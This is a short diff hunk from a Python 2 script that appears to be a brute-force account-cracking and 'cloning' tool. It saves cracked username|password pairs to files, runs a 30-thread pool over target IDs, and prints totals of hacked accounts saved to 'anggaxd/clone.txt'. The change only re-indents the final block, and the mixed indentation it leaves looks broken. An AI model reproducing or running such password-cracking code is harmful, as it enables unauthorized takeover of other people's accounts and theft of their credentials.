@@ -292,16 +292,17 @@ def action():
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
 									cpb.append(c+user+pass3)        
-except:
-    pass
-    p = ThreadPool(30)
-    p.map(main, id)
-    print '\x1b[1;97m--------------------------------------------------'
-    print '[\xe2\x9c\x93]crack tawaw bw ...'
-    print '[\xe2\x9c\x93] Total hack krawakan/swtawakan : ' + str(len(oks)) + '/' + str(len(cpb))
-    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
-    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
-    menu()
+		except:																		
+			pass
+		
+	p = ThreadPool(30)
+        p.map(main, id)
+        print '\x1b[1;97m--------------------------------------------------'
+        print '[\xe2\x9c\x93]crack tawaw bw ...'
+        print '[\xe2\x9c\x93] Total hack krawakan/swtawakan : ' + str(len(oks)) + '/' + str(len(cpb))
+        print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
+        raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
+        menu()
 
 
 if __name__ == '__main__':
